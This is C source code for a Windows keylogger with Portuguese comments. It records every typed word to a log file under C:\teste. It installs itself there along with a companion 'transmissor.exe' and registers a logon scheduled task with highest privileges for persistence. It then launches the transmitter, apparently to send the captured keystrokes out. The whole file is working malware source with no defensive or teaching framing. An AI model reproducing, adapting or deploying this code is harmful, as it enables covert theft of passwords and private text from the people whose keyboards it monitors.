#include <windows.h>
#include <wchar.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <ctype.h>

const char *BASE_FOLDER = "C:\\teste";

#define MAX_PATH_LEN 260

bool valPersis();
void chamadaTransmissor();

int main()
{
    FILE *fptr;
    char palavra[100];
    int count = 0;

    if (valPersis())
    {
        chamadaTransmissor();
        while (1)
        {
            for (int vk = 0x08; vk <= 0xFE; vk++)
            {
                if (GetAsyncKeyState(vk) & 0x0001)
                {
                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
                    WCHAR buffer[5];
                    int result = ToAscii(vk, scanCode, keyboardState, (LPWORD)buffer, 0);

                    if (result > 0)
                    {
                        char c = (char)buffer[0];

                        // Backspace
                        if (vk == VK_BACK)
                        {
                            if (count > 0)
                            {
                                count--;
                                palavra[count] = '\0';
                            }
                            continue;
                        }
                        if (vk == VK_RETURN || vk == VK_SPACE)
                        {
                            if (count > 0)
                            {
                                palavra[count] = '\0';

                                char logPath[MAX_PATH];
                                snprintf(logPath, sizeof(logPath), "%s\\logs.txt", BASE_FOLDER);

                                fptr = fopen(logPath, "a");
                                if (fptr)
                                {
                                    fprintf(fptr, "%s\n", palavra);
                                    fclose(fptr);
                                }
                                count = 0;
                                palavra[0] = '\0';
                            }
                            continue;
                        }

                        // Letras e números
                        if (isprint(c) && count < sizeof(palavra) - 1)
                        {
                            palavra[count++] = c;
                            palavra[count] = '\0';
                        }
                    }
                }
            }
            Sleep(90);
        }
    }

    return 0;
}

void chamadaTransmissor()
{
    char exePath[MAX_PATH_LEN];

    // Monta o caminho completo do transmissor.exe
    snprintf(exePath, MAX_PATH_LEN, "%s\\transmissor.exe", BASE_FOLDER);

    // Abre o transmissor.exe
    ShellExecute(
        NULL,
        "open",
        exePath, // aqui passamos a string já formatada
        NULL,
        NULL,
        SW_SHOWNORMAL);
}

bool valPersis()
{
    FILE *varsConf;
    char linha[50];
    int valor = 0;

    char configPath[MAX_PATH];
    snprintf(configPath, sizeof(configPath), "%s\\config.cfg", BASE_FOLDER);

    varsConf = fopen(configPath, "r");

    if (!varsConf)
    {
        char currentPath[MAX_PATH];
        char exeDir[MAX_PATH];
        char srcMain[MAX_PATH_LEN];
        char srcTrans[MAX_PATH_LEN];
        char dstMain[MAX_PATH_LEN];
        char dstTrans[MAX_PATH_LEN];

        // obtém caminho completo do exe atual
        if (GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0)
        {
            fprintf(stderr, "GetModuleFileName failed (%lu)\n", GetLastError());
            return 1;
        }

        // remove o nome do arquivo, ficando só a pasta
        strncpy(exeDir, currentPath, MAX_PATH - 1);
        exeDir[MAX_PATH - 1] = '\0';
        char *p = strrchr(exeDir, '\\');
        if (p)
            *p = '\0'; // agora exeDir é a pasta onde o exe atual está

        // Supondo que os executáveis que você quer copiar estão nessa mesma pasta
        // Ajuste "orig_main.exe" e "orig_transmissor.exe" para os nomes reais
        snprintf(srcMain, sizeof(srcMain), "%s\\main.exe", exeDir);

        snprintf(srcTrans, sizeof(srcTrans), "%s\\transmissor.exe", exeDir);

        // Cria pasta destino
        CreateDirectoryA(BASE_FOLDER, NULL);

        // destinos finais
        snprintf(dstMain, sizeof(dstMain), "%s\\main.exe", BASE_FOLDER);
        snprintf(dstTrans, sizeof(dstTrans), "%s\\transmissor.exe", BASE_FOLDER);

        // copia os arquivos — verifique se as origens existem
        if (!CopyFileA(srcMain, dstMain, FALSE))
        {
            fprintf(stderr, "CopyFile srcMain->dstMain falhou (%lu). Origem: %s\n", GetLastError(), srcMain);
        }

        if (!CopyFileA(srcTrans, dstTrans, FALSE))
        {
            fprintf(stderr, "CopyFile srcTrans->dstTrans falhou (%lu). Origem: %s\n", GetLastError(), srcTrans);
        }

        varsConf = fopen(configPath, "w");
        if (varsConf)
        {
            fprintf(varsConf, "pos=1\n");
            fclose(varsConf);
        }

        char schtasksCmd[MAX_PATH * 2];
        snprintf(schtasksCmd, sizeof(schtasksCmd),
                 "schtasks /create /tn \"MeuProgramaAutoStart\" /tr \"%s\" /sc onlogon /rl highest /f",
                 dstMain);

        system(schtasksCmd);

        return false;
    }
    else
    {
        if (fgets(linha, sizeof(linha), varsConf))
        {
            if (sscanf(linha, "pos=%d", &valor) == 1)
            {
                fclose(varsConf);
                return valor == 1;
            }
        }
        fclose(varsConf);
    }

    return false;
}

// gcc main.c -o main.exe -lole32 -luuid -lshell32; ./main.exe